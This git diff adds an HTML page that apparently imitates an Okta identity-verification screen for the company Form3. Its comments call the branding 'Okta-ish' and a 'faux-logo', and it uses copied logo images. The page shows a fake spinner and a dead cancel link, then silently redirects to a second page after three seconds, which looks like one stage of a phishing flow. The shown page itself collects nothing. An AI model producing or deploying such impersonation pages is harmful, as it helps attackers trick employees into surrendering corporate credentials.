@@ -1,1 +1,217 @@
-Hello GitHub.
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifying your identity</title>
+  <style>
+    :root{
+      --navy:#142a47;
+      --header:#eef0f2;
+      --text:#2f2f2f;
+      --muted:#6b6f76;
+      --line:#e7e7e7;
+      --blue:#0b3aa8;
+      --teal:#18b6ad;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      color:var(--text);
+      background:var(--navy);
+    }
+
+    /* Top bar */
+    .topbar{
+      height:72px;
+      background:var(--header);
+      border-bottom:1px solid #d9dde2;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      text-align:center;
+      padding:10px 16px;
+    }
+    .topbar .wrap{
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+      align-items:center;
+      line-height:1.1;
+    }
+    .topbar .title{
+      font-size:24px;
+      font-weight:500;
+      color:#60646b;
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .topbar .subtitle{
+      font-size:12px;
+      color:#7a7f87;
+      letter-spacing:.1px;
+    }
+
+    .bottombar{
+      position:fixed;
+      bottom:0;
+      left:0;
+      right:0;
+      height:44px;
+      background:var(--header);
+      border-top:1px solid #d9dde2;
+    }
+
+    /* Main */
+    .main{
+      height:calc(100% - 72px);
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      padding-top:92px;
+    }
+
+    /* Card */
+    .card{
+      width:380px;
+      background:#fff;
+      border:1px solid #dfe3e8;
+      border-radius:2px;
+      box-shadow:0 0 0 0 rgba(0,0,0,0.0);
+      overflow:hidden;
+    }
+    .card-inner{
+      padding:26px 22px 18px;
+      text-align:center;
+    }
+    .divider{
+      height:1px;
+      background:var(--line);
+      margin:18px -22px 18px;
+    }
+
+    /* “FORM3” faux-logo */
+    .logo{
+      font-weight:800;
+      letter-spacing:1px;
+      font-size:28px;
+      color:#1f2a37;
+      display:inline-flex;
+      align-items:baseline;
+      gap:0;
+    }
+    .logo .three{
+      color:var(--teal);
+      font-weight:800;
+      margin-left:2px;
+    }
+
+    /* Check badge */
+    .badge{
+      width:86px;
+      height:86px;
+      margin:4px auto 10px;
+      position:relative;
+      display:grid;
+      place-items:center;
+    }
+    .badge::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      border-radius:50%;
+      border:2px solid #cfcfcf;
+      background:#fff;
+    }
+    .badge svg{
+      width:54px;
+      height:54px;
+      position:relative;
+      z-index:1;
+      display:block;
+    }
+
+    .status{
+      margin-top:6px;
+      font-size:12px;
+      color:#4b4f56;
+      font-weight:600;
+    }
+
+    /* Spinner */
+    .spinner{
+      width:18px;
+      height:18px;
+      margin:20px auto 8px;
+      border-radius:50%;
+      border:3px solid rgba(11,58,168,.18);
+      border-top-color: rgba(11,58,168,.9);
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin{
+      to{transform:rotate(360deg)}
+    }
+
+    .link{
+      display:inline-block;
+      margin-top:18px;
+      font-size:11px;
+      color:#6b6f76;
+      text-decoration:underline;
+      cursor:pointer;
+    }
+    .link:hover{color:#4f5560}
+
+    /* Small tweaks for smaller screens */
+    @media (max-width:420px){
+      .card{width:92vw}
+      .main{padding-top:64px}
+      .topbar .title{font-size:20px}
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar" role="banner">
+    <div class="wrap">
+      <div class="title">
+        <span>Connecting to</span>
+        <!-- Okta-ish grid icon -->
+        <img src="tinylogo.png" width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
+      </div>
+      <div class="subtitle">Sign in with your account to access Okta Dashboard</div>
+    </div>
+  </header>
+
+  <main class="main" role="main">
+    <section class="card" aria-label="Verification">
+      <div class="card-inner">
+        <div class="logo" aria-label="FORM3">
+          <img src="form3logo.png" height="40" aria-hidden="true">
+        </div>
+
+        <div class="divider" aria-hidden="true"></div>
+
+        <img src="oktalogo.png" height="92" aria-hidden="true">
+        <div class="status">Verifying your identity</div>
+
+        <div class="spinner" aria-label="Loading"></div>
+
+        <a class="link" href="#" onclick="event.preventDefault();">
+          Cancel and take me to sign in
+        </a>
+      </div>
+    </section>
+  </main>
+  <footer class="bottombar" role="contentinfo"></footer>
+    <script>
+    // Redirect after 3 seconds
+    setTimeout(() => {
+      window.location.assign("./connectivitycheck2.html");
+    }, 3000);
+  </script>
+</body>
+</html>
+
